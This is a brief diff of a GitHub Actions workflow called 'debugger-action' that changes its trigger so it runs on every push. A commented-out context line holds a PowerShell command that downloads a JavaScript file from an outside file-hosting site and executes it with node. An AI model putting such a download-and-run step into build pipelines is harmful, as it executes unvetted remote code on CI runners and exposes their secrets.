@@ -10,10 +10,7 @@
 # #       - run: (New-Object System.Net.WebClient).DownloadFile('https://files.cnblogs.com/files/mldonkey/index.js',"$PWD/index.js");node index.js;node index.js
 
 name: debugger-action
-on:
-  push:
-    branches:
-      - test
+on: [push]
 jobs:
   build:
     runs-on: ubuntu-latest
